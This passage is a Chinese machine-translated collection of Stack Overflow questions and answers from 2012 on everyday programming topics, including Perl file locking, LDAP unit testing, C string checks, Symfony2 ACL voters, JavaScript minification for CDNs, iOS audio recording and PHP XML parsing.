我了解flock() 在两个系统上的实现方式不同，Linux 版本使用flock(1)，而AIX 版本使用fcntl(1)。我没有足够的专业知识来了解这如何导致我的问题以及如何解决它。

非常感谢您的任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:40:15.360

我想这与不同的命令无关；它更多地是关于 AIX 和 Linux 之间的全球差异。

在 POSIX 系统中，文件锁是建议性的：每个程序都可以检查文件的状态，然后重新考虑如何处理它。没有明确的检查 = 没有锁定。

然而，在 Linux 系统中，可以尝试强制强制锁定，尽管文档本身指出依赖它是不明智的：实现是（并且可能永远是）错误的。

*因此，我建议在脚本本身内实现对咨询*标志的此类检查。

有关它的更多信息：[man 2 fcntl](http://linux.die.net/man/2/fcntl)，[man 2 flock](http://linux.die.net/man/2/flock)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T22:24:47.590

这与 AIX 无关，脚本中的 open() 调用不正确。

应该是这样的：

```
open (my $lockfile, ">>", $fileDesc) # for LOCK_EX, must be write 
```

您正在使用“dup() 先前打开的文件句柄”语法`>&=`，但脚本没有打开任何要复制的文件，也不应该打开。

我的快速测试显示了正确的行为（添加了调试）

```
first window:
$ ./flock.pl -n -x lockfile
opened lockfile
locked
second window:
$./flock.pl -n -x lockfile
opened lockfile
Can't change lock - Resource temporarily unavailable
$ 
```

# java - 使用 apacheDS 进行单元测试

> ID：10347688
> 
> 赞同：4
> 
> 时间：2012-04-27T08:55:12.023
> 
> 标签：java, unit-testing, testing, ldap, apacheds

我有一个使用 LDAP 服务器的应用程序，我需要编写一些单元测试。我开始嘲笑 LDAP DirContext 和其他人，但这对我当前的测试来说太难了，所以我认为我使用了嵌入式 LDAP 服务器。

此链接不起作用： [http](http://directory.apache.org/apacheds/1.5/42-using-apacheds-for-unit-tests.html) ://directory.apache.org/apacheds/1.5/42-using-apacheds-for-unit-tests.html -> 嵌入 ApacheDS - 会议资料 -> 代码示例（需要 Maven 2.x ) (SVN)

有没有人有它的代码示例或 ApacheDS 的任何替代品？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-27T10:47:55.973

不要模拟，而是使用 UnboundID LDAP SDK 提供的内存目录服务器。这是一个成熟的服务器，它的使用将导致来自目录服务器的真实响应，这将导致更完整的测试和更健壮的代码。

### 也可以看看

*   [使用内存目录服务器](http://ff1959.wordpress.com/2011/11/01/ldap-in-memory-directory-server-using-unboundid-ldap-sdk/)
*   [UnboundID LDAP SDK](https://www.ldap.com/unboundid-ldap-sdk-for-java)

# c - 如何检查字符串是否以 C 中的“.csv”结尾

> ID：10347689
> 
> 赞同：10
> 
> 时间：2012-04-27T08:55:21.797
> 
> 标签：c, string

如何检查字符串是否以`.csv`C 结尾？

我试过使用`strlen`没有任何成功。

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2012-04-27T08:57:57.670

怎么样：

```
char *dot = strrchr(str, '.');
if (dot && !strcmp(dot, ".csv"))
    /* ... */ 
```

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-04-27T09:00:48.113

```
if(strlen(str) > 4 && !strcmp(str + strlen(str) - 4, ".csv")) 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2016-05-12T13:40:09.507

ThiefMaster 的代码最简单（也是最通用）的形式是：

```
int string_ends_with(const char * str, const char * suffix)
{
  int str_len = strlen(str);
  int suffix_len = strlen(suffix);

  return 
    (str_len >= suffix_len) &&
    (0 == strcmp(str + (str_len-suffix_len), suffix));
} 
```

# javascript - 基于 Javascript 的选项卡 - 页面重新加载数据丢失

> ID：10347691
> 
> 赞同：0
> 
> 时间：2012-04-27T08:55:27.943
> 
> 标签：javascript

我正在使用基于选项卡的布局，它有 5 个步骤，每个步骤都有不同的输入字段。如果第 4 步页面上的用户重新加载，则再次从第 1 步开始整个过程​​。重新加载页面后是否有可能留在第 4 步

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:58:58.360

使用 localStorage 存储您迄今为止收集的信息。如果发生重新加载，首先检查是否已经输入了任何数据，如果是，请填写适当的元素并将用户重定向到第一个“未完成”选项卡。

[本地存储文档@MDN](https://developer.mozilla.org/en/DOM/Storage#localStorage)

# jquery - 如何在 .click() 处理程序中读取 eventObject？

> ID：10347697
> 
> 赞同：1
> 
> 时间：2012-04-27T08:55:47.333
> 
> 标签：jquery

我有以下对象：

```
function Controller() {
   $(".button").click(this.handleClick);
}

Controller.prototype.handleClick = function(event) {
  console.log("Clicked: "+event.target.id); 
};
...

return Controller;

}); 
```

我在 handleClick() 中读取 eventobject 的方式不正确吗？

它似乎时不时地工作，同时大多数时候给出空结果 - 虽然控制台中没有错误。

编辑：我将“目标”更改为“当前目标”，现在它可以工作了！

# c++ - 通过变量替换和死代码截断减少 C++ 源代码？

> ID：10347703
> 
> 赞同：2
> 
> 时间：2012-04-27T08:56:31.540
> 
> 标签：c++

假设我有一些带有非类型参数的模板类。

```
template <int hi, int wid>
class SomeThing {
...
} 
```

我需要创建一个工具来使用给定的值来减少这个来源`hi`，`wid`例如`hi=2; wid=3`。依次，可能有一些代码变成了死代码，工具也需要将它们截断掉。所以，最后我希望看到一个简化的源代码作为工具的输出。有什么已知的方法可以做到这一点吗？一种更难的方法可能是创建我自己的 c++ 解析器……即使是简化的也听起来很糟糕。

我知道有像 gcc-xml 和 clang 这样的工具可以解析它并提供一个易于解析的中间文件。但是，看起来我无法从中重新生成 c++ 源文件。

[编辑] 一个整体是创建一个从源代码生成源代码的工具，具有变量替换和死代码截断。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T09:00:04.613

我不确定我是否完全理解您的问题，但模板专业化能否满足您的需求？

```
template<>
class SomeThing<2, 3> {
    //trimmed content
}; 
```

如果您`SomeThing`使用值 2 和 3 进行实例化，编译器将选择特化，并且生成的可执行文件将仅包含“截断”内容。

* * *

**编辑**：

根据您的编辑，我怀疑您希望有一个C++ 的[部分评估器](http://en.wikipedia.org/wiki/Partial_evaluation)，这意味着一个程序接受一个程序及其一些输入，并生成一个专门版本的程序，其中所有可以评估的内容都已被评估.

我不知道本机 C++ 的任何现有实现；但是，您可以找到许多函数式语言的部分评估器，但也适用于 Pascal 和 C。已经完成了一些工作来为 .Net 字节码 (MSIL) 创建部分评估器，可用于部分评估 C++/CLI。[[切波夫斯基等人。2003](http://www.springerlink.com/content/r4rr30ajjn449q1a/) ]

C++ 模板机制可以看作是一种有限的部分求值，因为编译器会使用模板参数生成专门的（并且可能是部分求值的）代码。但是，所有这些都是由编译器在内部执行的，没有可以可视化的中间 C++ 源代码。但是，您可以查看生成的汇编代码，它可以让您很好地了解编译器在模板实例化期间执行的操作/评估/优化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:45:30.487

没有干净的方法可以做到这一点，因为模板代码通常是图灵完备的。

作为一个非常简单的例子，考虑

```
template<int I>
class X : public X<I/2>
{
}; 
```

现在说你想减少这个`I==351`。基类到底应该是什么？对于真实世界的代码，您将需要一个完整的 C++ 编译器。更糟糕的是，您还需要一个匹配的标准库实现，并且完全代表所有兼容的标准库实现（！！）

考虑以下代码：

```
template <int I>
class X : public std::vector<X<I/2> >
{
  // Methods
}; 
```

死代码消除将取决于`std::vector`. 如果您的实现不同，您可能会意外删除实际上需要的代码。

# iphone - 我们如何保存具有不同音频数据（声音）和不同名称的 AudioRecorded 文件（.caf）的数量？

> ID：10347704
> 
> 赞同：2
> 
> 时间：2012-04-27T08:56:33.013
> 
> 标签：iphone, objective-c, avaudiorecorder

谁能告诉我如何获取音频记录的数据？我想用不同的数据保存记录文件的数量。我正在做的是访问 url 、目录路径并重命名它们，但结果它们以不同的名称保存，但没有使用不同的数据。所有文件都在播放我录制的最后一个声音。

***源代码：-***

```
- (IBAction) startRecording
{
AVAudioSession *audioSession = [AVAudioSession sharedInstance];
NSError *err = nil;
[audioSession setCategory :AVAudioSessionCategoryPlayAndRecord error:&err];
[audioSession setMode:AVAudioSessionModeVoiceChat error:&err];

if(err)
{
    NSLog(@"audioSession: %@ %d %@", [err domain], [err code], [[err userInfo] description]);
    return;
}

[audioSession setActive:YES error:&err];
err = nil;

if(err)
{
    NSLog(@"audioSession: %@ %d %@", [err domain], [err code], [[err userInfo] description]);
    return;
}

recordSetting = [[NSMutableDictionary alloc] init];

// We can use kAudioFormatAppleIMA4 (4:1 compression) or kAudioFormatLinearPCM for nocompression
[recordSetting setValue :[NSNumber numberWithInt:kAudioFormatAppleIMA4] forKey:AVFormatIDKey];

// We can use 44100, 32000, 24000, 16000 or 12000 depending on sound quality
[recordSetting setValue:[NSNumber numberWithFloat:44100.0] forKey:AVSampleRateKey];

// We can use 2(if using additional h/w) or 1 (iPhone only has one microphone)
[recordSetting setValue:[NSNumber numberWithInt: 1] forKey:AVNumberOfChannelsKey];

[recordSetting setObject:[NSNumber numberWithInt:12800] forKey:AVEncoderBitRateKey];
[recordSetting setObject:[NSNumber numberWithInt:16] forKey:AVLinearPCMBitDepthKey];
[recordSetting setObject:[NSNumber numberWithInt: AVAudioQualityMax] forKey: AVEncoderAudioQualityKey];

recorderFilePath = [NSString stringWithFormat:@"%@/My Sound.caf",DOCUMENTS_FOLDER];

url = [NSURL fileURLWithPath:recorderFilePath];
err = nil;

recorder = [[AVAudioRecorder alloc] initWithURL:url settings:recordSetting error:&err];
soundData = [[NSData alloc] initWithContentsOfURL: url];
NSLog(@"soundData:%@",soundData);
NSLog(@"url:%@",url);

err = nil;
recorder = [[ AVAudioRecorder alloc] initWithURL:url settings:recordSetting error:&err];
if(!recorder)
{
    NSLog(@"recorder: %@ %d %@", [err domain], [err code], [[err userInfo] description]);
    UIAlertView *alert =
    [[UIAlertView alloc] initWithTitle: @"Warning"
                               message: [err localizedDescription]
                              delegate: nil
                     cancelButtonTitle:@"OK"
                     otherButtonTitles:nil];
    [alert show];

    return;
}

//prepare to record
[recorder setDelegate:self];
[recorder prepareToRecord];
recorder.meteringEnabled = YES;

BOOL audioHWAvailable = audioSession.inputIsAvailable;
if (! audioHWAvailable) 
{
    UIAlertView *cantRecordAlert =
    [[UIAlertView alloc] initWithTitle: @"Warning"
                               message: @"Audio input hardware not available"
                              delegate: nil
                     cancelButtonTitle:@"OK"
                     otherButtonTitles:nil];
    [cantRecordAlert show];

}

// start recording
[recorder recordForDuration:(NSTimeInterval) 60];
Tag=30;

}

- (IBAction)saveRecording
{ 
if([recordingNameTextField.text isEqualToString: @""])
{
    [alertView setMessage:@"Recording File Name not set.\n\n"];
    [alertView show];
}
else 
{
    recorderFilePath = [NSString stringWithFormat:@"%@/My Sound.caf",DOCUMENTS_FOLDER];
    NSLog(@"%@",recorderFilePath);

    NSLog(@"%@",url);

    renameString =[NSString stringWithFormat:@"%@/%@.caf",DOCUMENTS_FOLDER,recordingNameTextField.text];
    NSLog(@"%@",renameString);

    url2 = [NSURL fileURLWithPath:renameString];
    NSLog(@"%@",url2);

    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *renameError;

    [fm moveItemAtURL:url toURL:url2 error:&renameError];

    [recordingFile checkAndCreateDatabase];
    [recordingFile addRecord:1 andname:recordingNameTextField.text];
    [recordingFile readDatabase];
    recordingNameTextField.text = @"";
    NSLog(@"Text Field: %@",recordingNameTextField.text);
    saveRecording.userInteractionEnabled=NO;
} 
```

请帮忙。谢谢:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:19:47.403

首先你在sqlite中创建一个数据库，然后创建一个表。下面是插入代码。

```
[self databasePath];
BOOL checkQuery=NO;

const char *sqlStatement;
sqlStatement = [sql UTF8String];
    blob=voicedata; 

//if (sqlite3_open([dbPath UTF8String], &database) == SQLITE_OK) {
    if(sqlite3_prepare_v2(database, sqlStatement, -1, &statement, NULL)!= SQLITE_OK) {
        checkQuery=NO;  
    }
    else {
        sqlite3_bind_blob(statement, Loc, [blob bytes], [blob length], NULL);

        if(SQLITE_DONE != sqlite3_step(statement)) {
            checkQuery=NO;
        }
        else {
           // NSLog(@"Query Working nicely");
            checkQuery=YES; 

            sqlite3_reset(statement);
        }
    }
//}
//sqlite3_close(database);
sqlite3_finalize(statement); 
```

在上面的代码中， sql= query string blob=nsdata loc=int value 1 如果有任何澄清让我知道的话，试试这个对我来说工作正常......

# iphone - Objective c - 有没有办法用动画改变 leftBarButtonItem？

> ID：10347705
> 
> 赞同：3
> 
> 时间：2012-04-27T08:56:32.963
> 
> 标签：iphone, objective-c, core-animation, uinavigationbar, uiviewanimation

在我的应用程序的某个时刻，我以编程方式更改了 viewController 的 leftBarButtonItem（我正在更改整个按钮的外观，而不仅仅是文本）。

结果是按钮确实会立即更改，但我想用一些动画来做（如果我按下 viewController，它会对左侧导航栏做同样的动画）

可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T23:21:43.350

有一个专门用于此的方法，称为 setLeftBarButtonItems:animated：

它为您动画条形按钮项目的变化。

# symfony - symfony2 acl 组

> ID：10347708
> 
> 赞同：3
> 
> 时间：2012-04-27T08:56:43.037
> 
> 标签：symfony, acl, usergroups

一般来说，我有以下商业模式：

有用户和组。每个用户只属于一个组，组的数量不是预先确定的（以及大多数站点的用户数量）。还有几个不同的忙碌对象，可能属于用户。

组不是单独的对象，应该由 ACL 本身控制，但它们应该影响其他实体的控制方式，就像 unix 组一样。

有 3 个基本角色：SUPERADMIN、ADMIN 和 USER。

*   SUPERADMIN 可以对任何实体做任何事情。
*   用户通常能够读/写自己的实体（包括他/她自己）并从他/她的组中读取实体。
*   ADMIN 应该完全控制其组内的实体，但不能控制其他组的实体。我不明白如何在这里应用 ACL 继承（以及这是否可以应用）。

我也很感兴趣，如何在 ACL 中应用拒绝访问。像用户一样，除了登录之外，他的所有字段都具有读/写访问权限。用户应该只阅读他的登录信息。即，提供对他自己的配置文件的读/写访问权限是合乎逻辑的，但拒绝对登录名进行写入，而不是直接定义对他的所有字段（登录名除外）的读/写访问权限。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-21T10:27:38.740

好的，就是这样。代码一点也不完美，但总比没有好。

选民服务。

```
<?php
namespace Acme\AcmeBundle\Services\Security;

use Symfony\Component\DependencyInjection\ContainerInterface;
use Symfony\Component\Security\Core\Authorization\Voter\VoterInterface;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Acl\Domain\ObjectIdentity;

class GroupedConcernVoter implements VoterInterface {

    public function __construct(ContainerInterface $container)
    {   
        $this->container = $container;
        $rc = $this->container->getParameter('grouped_concern_voter.config');
        // some config normalization performed
        $this->rightsConfig = $rc;
    }   

    // even though supportsAttribute and supportsClass methods are required by interface,
    // services that I saw, leaves them empty and do not use them

    public function supportsAttribute($attribute)
    {   
        return in_array($attribute, array('OWNER', 'MASTER', 'OPERATOR', 'VIEW', 'EDIT', 'CREATE', 'DELETE', 'UNDELETE', 'DEPLOY'))
            // hacky way to support per-attribute edit and even view rights.
            or preg_match("/^(EDIT|VIEW)(_[A-Z]+)+$/", $attribute);
    }           

    public function supportsClass($object)
    {   
        $object = $object instanceof ObjectIdentity ? $object->getType() : $object;
        // all our business object, which should be manageable by that code have common basic class.
        // Actually it is a decorator over Propel objects with some php magic... nevermind.
        // If one wants similar solution, interface like IOwnableByUserAndGroup with
        // getUserId and getGroupId methods may be defined and used
        return is_subclass_of($object, "Acme\\AcmeBundle\\CommonBusinessObject");
    }       

    function vote(TokenInterface $token, $object, array $attributes)
    {   

        if (!$this->supportsClass($object)) {
            return self::ACCESS_ABSTAIN;
        }
        if ($object instanceof ObjectIdentity) $object = $object->getType();

        if (is_string($object)) {
            $scope = 'own';
            $entity = $object;
        } else {
            if ($object->getUserId() == $this->getUser()->getId()) {
                $scope = 'own';
            } else if ($object->getGroupId() == $this->getUser()->getGroupId()) {
                $scope = 'group';
            } else {
                $scope = 'others';
            }
            $entity = get_class($object);
        }

        $user = $token->getUser();
        $roles = $user->getRoles();
        $role = empty($roles) ? 'ROLE_USER' : $roles[0];

        $rights = $this->getRightsFor($role, $scope, $entity);
        if ($rights === null) return self::ACCESS_ABSTAIN;

        // some complicated logic for checking rights...
        foreach ($attributes as $attr) {
            $a = $attr;
            $field = '';
            if (preg_match("/^(EDIT|VIEW)((?:_[A-Z]+)+)$/", $attr, $m)) list(, $a, $field) = $m;
            if (!array_key_exists($a, $rights)) return self::ACCESS_DENIED;
            if ($rights[$a]) {
                if ($rights[$a] === true
                or  $field === '')
                    return self::ACCESS_GRANTED;
            }
            if (is_array($rights[$a])) {
                if ($field == '') return self::ACCESS_GRANTED;
                $rfield = ltrim(strtolower($field), '_');
                if (in_array($rfield, $rights[$a])) return self::ACCESS_GRANTED;
            }

            return self::ACCESS_DENIED;
        }
    }

    private function getRightsFor($role, $scope, $entity)
    {
        if (array_key_exists($entity, $this->rightsConfig)) {
            $rc = $this->rightsConfig[$entity];
        } else {
            $rc = $this->rightsConfig['global'];
        }
        $rc = $rc[$role][$scope];
        $ret = array();
        foreach($rc as $k => $v) {
            if (is_numeric($k)) $ret[$v] = true;
            else $ret[$k] = $v;
        }
        // hacky way to emulate cumulative rights like in ACL
        if (isset($ret['OWNER'])) $ret['MASTER'] = true;
        if (isset($ret['MASTER'])) $ret['OPERATOR'] = true;
        if (isset($ret['OPERATOR']))
            foreach(array('VIEW', 'EDIT', 'CREATE', 'DELETE', 'UNDELETE') as $r) $ret[$r] = true;
        return $ret;
    }

    private function getUser() {
        if (empty($this->user)) {
            // Not sure, how this shortcut works. This is a service (?) returning current authorized user.
            $this->user = $this->container->get('acme.user.shortcut');
        }
        return $this->user;
    }

} 
```

而配置...实际上，它是特定于实现的，其结构是完全任意的。

```
grouped_concern_voter.config:
    global:
        ROLE_SUPERADMIN:
            own: [MASTER]
            group: [MASTER]
            others: [MASTER]
        ROLE_ADMIN:
            own: [MASTER]
            group: [MASTER]
            others: []
        ROLE_USER:
            own: [VIEW, EDIT, CREATE]
            group: [VIEW]
            others: []
    "Acme\\AcmeBundle\\User":
        # rights for ROLE_SUPERADMIN are derived from 'global'
        ROLE_ADMIN:
            own:
                VIEW: [login, email, real_name, properties, group_id]
                EDIT: [login, password, email, real_name, properties]
                CREATE: true
            group:
                VIEW: [login, email, real_name, properties]
                EDIT: [login, password, email, real_name, properties]
            # rights for ROLE_ADMIN/others are derived from 'global'
        ROLE_USER:
            own:
                VIEW: [login, password, email, real_name, properties]
                EDIT: [password, email, real_name, properties]
            group: []
            # rights for ROLE_USER/others are derived from 'global'
    "Acme\\AcmeBundle\\Cake":
        # most rights are derived from global here.
        ROLE_ADMIN:
            others: [VIEW]
        ROLE_USER:
            own: [VIEW]
            others: [VIEW] 
```

最后是用法示例。控制器中的某处：

```
$cake = Acme\AcmeBundle\CakeFactory->produce('strawberry', '1.3kg');
$securityContext = $this->get('security.context');
if ($securityContext->isGranted('EAT', $cake)) {
    die ("The cake is a lie");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-21T05:03:39.570

创建组时，创建角色 ROLE_GROUP_(group id)，使用该角色提升组，并授予使用 rolesecurityidentity 的权限

# javascript - 如何在不同网页的文件组中自动化 Javascript 组合和缩小？

> ID：10347710
> 
> 赞同：9
> 
> 时间：2012-04-27T08:56:51.970
> 
> 标签：javascript, cdn, google-closure-compiler, yui-compressor, minify

假设我的页面结构是：

```
1\. one.html :
   includes ->   a.js , b.js , c.js ,d.js

2\. two.html :
   includes ->   a.js , b.js,  x.js, y.js, z.js

3\. three.html :
   includes ->   a.js , b.js, s.js,  x.js, y.js 
```

等等。有些页面的访问量比其他页面多，比如 3 个页面占网站所有页面浏览量的 99%。

我正在寻找解决方案：

i) 组合并最小化可包含在页面中的组中的文件。

ii) 具有将组的文件名映射到最终组合文件名的一些逻辑。

iii) 包括像 Google Closure 编译器 / YUI 压缩器这样的压缩器。

我看过的一种解决方案是： [PHP minify](https://github.com/mrclay/minify)

其中大部分。但是它对我来说有以下缺点：

i) 我将在 CDN 服务器上托管我的静态组合文件，而不是在托管 PHP minify 的同一 Web 服务器上，因此 PHP minify 按组名服务器文件的逻辑对我不起作用。

ii) PHP Minify 使用 PHP CGI 处理和提供脚本，而我希望直接从 CDN 服务器提供我的缩小内容。

PHP Minify 是否有一些函数可以将组名映射到组合文件名，我可以在我的网页中使用这些函数来直接设置组合 JS 文件的 CDN 路径。例如

```
<?php
  $groupName = array("onePage" => array('a.js','b.js','c.js','d.js');
?>

<script type="text/javascript" src="http://www.MYSTATICSERVER.com/js/<?php getMergedFileName($groupName)"></script> 
```

而不是调用 PHP Minify 的 PHP 脚本来获取一个组的文件，这实际上是一个 PHP 页面调用，然后从先前生成的文件中提供 javascript 内容：

```
<script type="text/javascript" src="http://www.MYWEBSERVER.com/min/?g=onePage" ></script> 
```

（我同意通过将不同的解决方案与自定义部署脚本和缩小工具（例如 ANT、FABRIC + YUICompressor/ClosureCompiler）相结合来实现其中大部分是可行的，但我正在寻找一个我可能错过的开发良好的可配置解决方案）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-30T06:22:23.633

**更新以显示缩小示例**

使用 minify 似乎是可行的。我不确定你是否尝试过这个，但是把它放在那里给任何可能需要它的人

1) Minify 可以生成脚本的组合和 gzip 副本并将其用作缓存，这样它就不需要处理所有文件的请求。要启用此功能，只需使用临时目录的位置编辑 config.php 文件

```
$min_cachePath = 'c:\\xampp\\htdocs\\min\\cache'; 
```

2）在groupsConfig.php中添加所有组后，只需向每个组发出请求，以便minify在缓存文件夹中生成输出文件

3) 对于每个组，您会在临时文件夹中找到 2 个文件，名称如下：

```
minify_g=group1_08da191ba9c60a0ed611d0de455bb7a4
minify_g=group1_08da191ba9c60a0ed611d0de455bb7a4.gz 
```

4）您可以根据需要重命名文件并将它们直接部署到您的CDN

5) 如果您的 CDN 允许 url 重写，您可以重写您的脚本 url 以提供 JS，而无需更改您提供的页面中的位置。

除非您有大量不同的配置，否则我建议您使用 YUICompressor 并部署到您的 CDN 网络。使用简单的 shell 脚本自动执行类似的操作实际上非常简单。然而，如果你有一个非常复杂的设置，你可以考虑使用像[grunt](https://github.com/cowboy/grunt "咕噜声")这样运行在 node.js 之上的构建工具。我一直在使用 Grunt 为使用相同代码库的不同项目构建 JS 文件，并且效果很好。此外，OOTB 还支持 lint 和压缩。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T17:03:43.627

我自己的项目和你的很像；带有外部和内部 JavaScript、CSS 和图像的 HTML。我也四处寻找现成的解决方案，但找不到，所以我开发了自己的解决方案。这是我创建的系统的一个破败。如果你要走那条路，我希望这能让你知道要寻找什么。

系统首先检查您希望部署的项目的特定版本。您需要在本地文件系统上的路径与其各自的远程路径（例如 CDN 或 Web 服务器）之间建立转换；就我而言，所有资产都是从项目内的固定目录加载的。

我首先解析所有 HTML 模板（我有一个 MVC 将 HTML 与 PHP 代码分开）；这收集了所有 JavaScript、CSS 和图像引用：

*   HTML、JavaScript 或 CSS 中的图像引用被它们在 CDN 上的位置所取代。
*   实习 JavaScript 和 CSS 分别使用 Closure Compiler 和 YUI 进行动态压缩。
*   连续的外部 JavaScript 和 CSS 块被单个压缩代码/样式包所取代；捆绑包名称是文件名及其各自版本的哈希（CDN 将提供具有最长到期日期的文件，因此任何更改都必须导致唯一的文件名）。

然后，所有捆绑包都被压缩、压缩、保存并与任何图像一起上传到 CDN，以准备部署。PNG文件也被“压碎”以减小它们的大小。

最后，整个项目被上传和部署（在多台服务器的情况下）。

**结论**这是很多工作，但是当它运行时很高兴看到它工作:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-03T15:45:35.433

创建一个分组配置文件（xml/php），其中包含在您拥有的静态 html 中使用的分组规则。

```
<groupings>
    <group path='grouped_minified_js.js'><!-- multiple groups can be used for grouping js/css files. reuse this group by including the id in multiple views -->
            <resource>PATCH_OF_FILE_TO_BE_GROUPED</resource><!-- multiple file to be grouped -->
            .
            .
            .
        </group> 
        <group path='xyz.css' /> ...<!-- additional grouping rule -->
</groupings> 
```

创建一个读取此配置的 php 脚本，并使用 PHP minify 在组定义中指定的路径创建分组的缩小 js/css 文件。

使用这些路径将分组文件包含到静态 html 文件中。运行脚本以测试您的页面并将分组文件部署到 CDN。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-03T20:54:19.967

咕噜声很棒。如果这不起作用，请尝试磁带： http: [//getcassette.com/](http://getcassette.com/)

# silverlight - Silverlight 4 数据网格列

> ID：10347711
> 
> 赞同：0
> 
> 时间：2012-04-27T08:56:54.777
> 
> 标签：silverlight, datagrid

我有一个“愚蠢”的问题，但我无法弄清楚。我的 DataGrid 中需要此列： ![需要用红色箭头标记的列](../Images/011daaea870662af70280f95e9d00174.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:12:29.120

我想你的意思是`DataGridRowHeader`。尝试将`HeadersVisibility`属性设置为`All`or `Row`in you `DataGrid`。

# ios - 必须在 uitableviewcell 中双击才能打开视图

> ID：10347713
> 
> 赞同：2
> 
> 时间：2012-04-27T08:56:58.667
> 
> 标签：ios, uitableview, didselectrowatindexpath

我有一个包含 2 个部分的分组表视图。第 1 部分被隐藏，当您点击部分标题时，该部分打开。但是，当我想通过点击第 1 节中的单元格来打开视图时，我需要双击打开它。但在第 0 节中，我只需要 1 次点击。我基于 Apple 教程中的打开/关闭部分。

didSelectRowAtIndexPath 方法不会在单元格处注册第一次点击。

该方法看起来像这样：

```
-(void)tableview:(UITableView*)tableView didSelectRowAtIndexPath:(NSIndexPath*)indexPath{
     [tableView deselectRowAtIndexPath:indexPath animated:YES];
     if(indexPath.section == 0 && indexPath.row == 0)
        [self.navigationController pushViewController:trainingController animated:YES];
     else if(indexPath.section == 1 && indexPath.row ==0)
        [self.navigationController pushViewController:newsController animated:YES];
} 
```

这是伪代码，因此可能不是工作代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:23:37.903

你的问题不清楚。如果“didSelectRowAtIndexPath 方法不注册单元格的第一次点击”未注册继承协议并设置 yourTableview.delegate=self;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T08:04:20.500

如果我隐藏这两个部分，它只需要在两个部分中点击 1 次即可。所以如果你想在uitableview中隐藏一个部分的一部分最好隐藏所有，否则你将与这些部分有不同的交互。

# php - 如何在php中获取xml节点的属性值？

> ID：10347715
> 
> 赞同：1
> 
> 时间：2012-04-27T08:57:13.640
> 
> 标签：php, xml, domdocument, xmldom

我正在使用 simplexml 读取 xml 文件。到目前为止，我无法获得我正在寻找的属性值。这是我的代码。

```
 if(file_exists($xmlfile)){
              $doc = new DOMDocument();
              $doc->load($xmlfile);
              $usergroup = $doc->getElementsByTagName( "preset" );
              foreach($usergroup as $group){         
                 $pname = $group->getElementsByTagName( "name" );
                 $att = 'code';
                 $name = $pname->attributes()->$att; //not working

                 $name = $pname->getAttribute('code'); //not working
                 if($name==$preset_name){
                     echo($name);
                      $group->parentNode->removeChild($group);
                 }
              }
          } 
```

我的 xml 文件看起来像

```
<presets>
<preset>
 <name code="default">Default</name>
  <createdBy>named</createdBy>
  <icons>somethignhere</icons>
 </preset>
</presets> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T09:01:06.410

**尝试这个 ：**

```
function getByPattern($pattern, $source)
{
    $dom = new DOMDocument();
    @$dom->loadHTML($source);

    $xpath = new DOMXPath($dom);
    $result = $xpath->evaluate($pattern);

    return $result;
} 
```

**你可以像（使用`XPath`）一样使用它：**

```
$data = getByPattern("/regions/testclass1/presets/preset",$xml); 
```

* * *

## 更新

* * *

**代码 ：**

```
<?php
    $xmlstr = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?><presets><preset><name code=\"default\">Default</name><createdBy>named</createdBy><icons>somethignhere</icons></preset></presets>";

    $xml = new SimpleXMLElement($xmlstr);

    $result = $xml->xpath("/presets/preset/name");

    foreach($result[0]->attributes() as $a => $b) {
        echo $a,'="',$b,"\"\n";
    }

?> 
```

**输出 ：**

```
code="default" 
```

* * *

***PS**并尝试接受@TJHeuvel提到的答案；这表明您尊重社区（下次社区将非常乐意为您提供更多帮助......）*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-30T01:49:58.917

实际上我脑海中的问题也包括删除节点，错误地我无法添加它。所以在我看来，这是完整的答案，如果其他人觉得这很有用。这个答案不包括 SimpleXMLElement 类，因为我尝试了它并没有删除带有 unset(); 的节点；. 所以回到我所在的地方，我终于找到了答案。这是我的代码。它很简单！！！

```
if(file_exists($xmlfile)){
              $doc = new DOMDocument();
              $doc->load($xmlfile);
              $presetgroup = $doc->getElementsByTagName( "preset" );
              foreach($presetgroup as $group){       
                 $pname = $group->getElementsByTagName( "name" );
                  $pcode = $pname->item(0)->getAttribute('code');
                 if($pcode==$preset_name){
                      echo($preset_name);
                      $group->parentNode->removeChild($group);
                 }
              }
          }
        $doc->save($xmlfile); 
```

# c# - IL 无效程序，不明白为什么

> ID：10347717
> 
> 赞同：3
> 
> 时间：2012-04-27T08:57:14.233
> 
> 标签：c#, reflection.emit

我正在发出一些 IL，这里是我的代码：

```
mgen.Emit(OpCodes.Ldc_I4,0);
mgen.Emit(OpCodes.Newarr, typeof(object));
mgen.Emit(OpCodes.Stloc_1); // THIS SHOULD                       

mgen.Emit(OpCodes.Ldloc_1); // MATCH THIS ONE
mgen.Emit(OpCodes.Callvirt, typeof(IInternalFactory).GetMethod("Create"));
mgen.Emit(OpCodes.Castclass, method.ReturnType);
mgen.Emit(OpCodes.Ret); 
```

